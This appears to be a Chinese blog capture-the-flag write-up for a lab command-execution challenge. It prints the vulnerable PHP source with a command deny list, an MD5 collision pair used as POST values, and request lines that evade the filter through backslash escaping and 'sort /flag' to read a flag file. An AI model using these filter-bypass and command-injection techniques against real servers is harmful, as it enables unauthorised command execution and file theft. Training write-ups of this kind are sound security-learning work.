{"title":"东塔靶场-CTF-命令执行_2","uid":"8ced8e9ea7483c651973016447b0e3bf","slug":"东塔靶场-CTF-命令执行-2","date":"2022-03-16T00:50:33.000Z","updated":"2022-03-16T02:07:48.444Z","comments":true,"path":"api/articles/东塔靶场-CTF-命令执行-2.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>东塔靶场一道关于MD5强类型的题目，感觉有点有趣，记录一下。</p>\n<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>打开靶场，提示有趣的md5，并且地址栏中像是被base64加密过</p>\n<p><img src=\"/post/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.htm/image-20220316085212437.png\" alt=\"image-20220316085212437\"></p>\n<p>查看源码，最可疑的是这张图片的地址，base64加密</p>\n<p><img src=\"/post/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.htm/image-20220316085328265.png\" alt=\"image-20220316085328265\"></p>\n<p>先解码，得到是<code>dota.png</code>这张图片</p>\n<p><img src=\"/post/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.htm/image-20220316090806061.png\" alt=\"image-20220316090806061\"></p>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><p>先将url解码试试</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">解码前：TmpRMlpqYzBOakV5WlRjd05tVTJOdz09\n解码后：NjQ2Zjc0NjEyZTcwNmU2Nw&#x3D;&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>解码后又是一个base64，再进行解码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">解码前：NjQ2Zjc0NjEyZTcwNmU2Nw&#x3D;&#x3D;\n解码后：646f74612e706e67<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>看着像16进制编码后的结果，试试16进制解码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">解码前：646f74612e706e67\n解码后：dota.png<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>解码完之后是<code>dotd.png</code>这张图片。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">那这里的逻辑应该是这样的：\ndota.png这张图片被三次编码之后放入地址栏中被解析成一张图片，结合上面将源码中的图片地址进行base64解码之后得到的正好是dota.png,那这里就不难理解了：url中将图片三次编码后，最后又被解析成了源码中的链接；而这里我们正好需要知道源码，那将index.php逆向的进行编码然后放入地址栏中，源码中就会出现index.php的源码链接，解码之后就是源码。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>将<code>index.php</code>进行逆向三次加密</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">十六进制：696e6465782e706870\n第一次base64加密：Njk2ZTY0NjU3ODJlNzA2ODcw\n第二次base64加密：TmprMlpUWTBOalUzT0RKbE56QTJPRGN3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p> 然后将最终编码后的<code>index.php</code>放入地址栏中进行解析</p>\n<p><img src=\"/post/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.htm/image-20220316091829007.png\" alt=\"image-20220316091829007\"></p>\n<p>打开源码，复制<code>index.php</code>的链接进行base64解码</p>\n<p><img src=\"/post/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.htm/image-20220316091946741.png\" alt=\"image-20220316091946741\"></p>\n<p>得到源代码</p>\n<p><img src=\"/post/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.htm/image-20220316092031938.png\" alt=\"image-20220316092031938\"></p>\n<h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p>将源码复制出来，进行代码审计</p>\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">&lt;!DOCTYPE html&gt;\n&lt;!--[if lt IE 7]&gt; &lt;html class&#x3D;&quot;no-js lt-ie9 lt-ie8 lt-ie7&quot; lang&#x3D;&quot;en&quot;&gt; &lt;![endif]--&gt;\n&lt;!--[if IE 7]&gt;    &lt;html class&#x3D;&quot;no-js lt-ie9 lt-ie8&quot; lang&#x3D;&quot;en&quot;&gt; &lt;![endif]--&gt;\n&lt;!--[if IE 8]&gt;    &lt;html class&#x3D;&quot;no-js lt-ie9&quot; lang&#x3D;&quot;en&quot;&gt; &lt;![endif]--&gt;\n&lt;!--[if gt IE 8]&gt;&lt;!--&gt; &lt;html class&#x3D;&quot;no-js&quot; lang&#x3D;&quot;en&quot;&gt; &lt;!--&lt;![endif]--&gt;\n&lt;head&gt;\n  &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;\n  &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width&quot; &#x2F;&gt;\n  &lt;title&gt;dongta xueyuan&lt;&#x2F;title&gt;  \n  &lt;!-- Included CSS Files (Uncompressed) --&gt;\n  &lt;!--\n  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;..&#x2F;stylesheets&#x2F;foundation.css&quot;&gt;\n  --&gt;  \n  &lt;!-- Included CSS Files (Compressed) --&gt;\n \n  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;stylesheets&#x2F;foundation.min.css&quot;&gt;\n  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;stylesheets&#x2F;app.css&quot;&gt;\n  &lt;link rel&#x3D;&quot;icon&quot; href&#x3D;&quot;.&#x2F;dt.png&quot; type&#x3D;&quot;image&#x2F;x-icon&quot;&gt;\n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;modernizr.foundation.js&quot;&gt;&lt;&#x2F;script&gt;\n  &lt;!-- IE Fix for HTML5 Tags --&gt;\n  &lt;!--[if lt IE 9]&gt;\n    &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;html5shiv.googlecode.com&#x2F;svn&#x2F;trunk&#x2F;html5.js&quot;&gt;&lt;&#x2F;script&gt;\n  &lt;![endif]--&gt;\n  &lt;link href&#x3D;&#39;http:&#x2F;&#x2F;fonts.googleapis.com&#x2F;css?family&#x3D;Open+Sans&#39; rel&#x3D;&#39;stylesheet&#39; type&#x3D;&#39;text&#x2F;css&#39;&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;div class&#x3D;&quot;row&quot;&gt;\n\t&lt;div class&#x3D;&quot;four columns centered&quot;&gt;\n\t\t&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;img src&#x3D;&quot;images&#x2F;dota.png&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;p&gt;\n\t\t&lt;fieldset&gt;\n\t\t &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;\n        .org12\n        &#123;\n            color: #f60;\n        &#125;\n        .grey12\n        &#123;\n            color: #989898;\n        &#125;\n    &lt;&#x2F;style&gt;\n\n \n\n&lt;font class&#x3D;&quot;org12&quot;&gt;★★&lt;&#x2F;font&gt;&lt;font class&#x3D;&quot;grey12&quot;&gt;★&lt;&#x2F;font&gt;&lt;font class&#x3D;&quot;grey12&quot;&gt;&lt;&#x2F;font&gt;\n\t\t\t&lt;legend&gt;Details&lt;&#x2F;legend&gt;\n&lt;?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);\n$cmd &#x3D; $_GET[&#39;cmd&#39;];\nif (!isset($_GET[&#39;tup&#39;]) || !isset($_GET[&#39;cmd&#39;])) \n    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?tup&#x3D;TmpRMlpqYzBOakV5WlRjd05tVTJOdz09&amp;cmd&#x3D;&#39;);\n$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;tup&#39;])));\n\n$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);\nif (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;\n    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;\n    die(&quot;这里没有flag&quot;);\n&#125; else &#123;\n    $txt &#x3D; base64_encode(file_get_contents($file));\n    echo &quot;&lt;br&#x2F;&gt;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;\n    echo &quot;&lt;br&gt;&quot;;\n&#125;\necho $cmd;\necho &quot;&lt;br&gt;&quot;;\nif (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\&#96;|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;\n    echo(&quot;forbid ~&quot;);\n    echo &quot;&lt;br&gt;&quot;;\n&#125; else &#123;\n    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;\n        echo &#96;$cmd&#96;;\n    &#125; else &#123;\n        echo (&quot;有趣的md5&quot;);\n    &#125;\n&#125;\n\n?&gt;\n\n&lt;&#x2F;div&gt;  \n  &lt;!-- Included JS Files (Uncompressed) --&gt;\n  &lt;!--  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.mediaQueryToggle.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.forms.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.reveal.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.orbit.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.navigation.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.buttons.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.tabs.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.tooltips.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.accordion.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.placeholder.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.alerts.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.topbar.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.joyride.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.clearing.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.magellan.js&quot;&gt;&lt;&#x2F;script&gt;  \n  --&gt;  \n  &lt;!-- Included JS Files (Compressed) --&gt;\n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.js&quot;&gt;&lt;&#x2F;script&gt;\n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;foundation.min.js&quot;&gt;&lt;&#x2F;script&gt;  \n  &lt;!-- Initialize JS Plugins --&gt;\n  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;app.js&quot;&gt;&lt;&#x2F;script&gt;  \n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到，很多命令都被过滤了</p>\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\&#96;|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;\n    echo(&quot;forbid ~&quot;);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>但只要符合下面的条件就可以执行命令</p>\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;\n       echo &#96;$cmd&#96;;\n   &#125; <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>这里绕过MD5函数的比较，又因为强行进行了string转换，所以我们这里不能进行数组绕过md5；所以这里需要构造出满足这样条件的md5；</strong></p>\n<p>POST：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2\n&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p>由于过滤了很多命令，但查看目录的命令<code>dir</code>没有被禁用；查看一下当前目录有没有flag：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">POST &#x2F;index.php?cmd&#x3D;dir<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.htm/image-20220316094902981.png\" alt=\"image-20220316094902981\"></p>\n<p>当前目录中没有flag，去根目录找一下flag：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">POST &#x2F;index.php?cmd&#x3D;dir%20&#x2F;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.htm/image-20220316095044884.png\" alt=\"image-20220316095044884\"></p>\n<p>有flag文件。</p>\n<p>读取flag，由于<code>cat</code>被禁用了，但在linux命令中可以加反斜杠<code>(\\)</code>进行逃逸：</p>\n<p><img src=\"/post/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.htm/image-20220316095657940.png\" alt=\"image-20220316095657940\"></p>\n<p>得到flag。</p>\n<p>或者可以使用sort &#x2F;flag进行读取：<br><img src=\"/post/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.htm/image-20220316095907910.png\" alt=\"image-20220316095907910\"></p>\n<p>（Linux sort命令用于将文本文件内容加以排序。）</p>\n<p>查看目录也可以使用反斜杠<code>(\\)</code>逃逸：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">POST &#x2F;index.php?cmd&#x3D;l\\s%20&#x2F;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.htm/image-20220316100108501.png\" alt=\"image-20220316100108501\"></p>\n<h2 id=\"0x05-总结\"><a href=\"#0x05-总结\" class=\"headerlink\" title=\"0x05 总结\"></a>0x05 总结</h2><p>这里难点主要在于MD5的强类型绕过；linux命令的熟悉程度和反斜杠逃逸。</p>\n<p>参考文章：</p>\n<p>浅谈MD5强类型碰撞：</p>\n<p><a href=\"https://baijiahao.baidu.com/s?id=1691028605507773400&wfr=spider&for=pc\">https://baijiahao.baidu.com/s?id=1691028605507773400&amp;wfr=spider&amp;for=pc</a></p>\n<p>MD5强类型绕过：</p>\n<p><a href=\"https://blog.csdn.net/weixin_43332695/article/details/119349204\">https://blog.csdn.net/weixin_43332695/article/details/119349204</a></p>\n<p><a href=\"https://blog.csdn.net/CSDNiamcoming/article/details/108837347\">https://blog.csdn.net/CSDNiamcoming/article/details/108837347</a></p>\n","text":"前言东塔靶场一道关于MD5强类型的题目，感觉有点有趣，记录一下。 0x00打开靶场，提示有趣的md5，并且地址栏中像是被base64加密过 查看源码，最可疑的是这张图片的地址，base64加密 先解码，得到是dota.png这张图片 0x01先将url解码试试 解码前：TmpRM...","link":"","photos":[],"count_time":{"symbolsCount":"8.9k","symbolsTime":"8 mins."},"categories":[{"name":"CTF","slug":"CTF","count":10,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":19,"path":"api/tags/CTF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05-%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">0x05 总结</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BUU-SQL注入-寻找注入点","uid":"61025c4bc325a8f722ff6e7c3ae2291b","slug":"BUU-SQL注入-寻找注入点","date":"2022-03-18T02:49:56.000Z","updated":"2022-03-20T11:49:02.076Z","comments":true,"path":"api/articles/BUU-SQL注入-寻找注入点.json","keywords":null,"cover":[],"text":"前言记录一下BUU的一道SQL注入，这道题难点主要在于寻找注入点。 0x00 启动靶场启动靶场后发现只有两个页面，一个是热点页面，一个是登录页面，开始以为登录页面存在注入，测试了很多，万能密码，甚至抓包修改Referer值探测注入点也都没有结果。 0x01 信息搜集登录页面无果后...","link":"","photos":[],"count_time":{"symbolsCount":"1.6k","symbolsTime":"1 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"CTF","slug":"CTF","count":19,"path":"api/tags/CTF.json"},{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"攻防世界-web-backup","uid":"34ee629d2bfd49882af5b4a30f7de5be","slug":"攻防世界-web-backup","date":"2022-03-15T09:19:29.000Z","updated":"2022-03-15T09:27:07.975Z","comments":true,"path":"api/articles/攻防世界-web-backup.json","keywords":null,"cover":[],"text":"前言记录一下攻防世界新手区，web-backup这道题。关于index.php的备份文件。 0x00启动靶场，看到：你知道index.php的备份文件名吗？ 0x01使用搜索引擎 0x02在地址栏输入：index.php.bak，可以看到备份文件下载完成 0x03打开备份文件，拿...","link":"","photos":[],"count_time":{"symbolsCount":193,"symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":10,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":19,"path":"api/tags/CTF.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}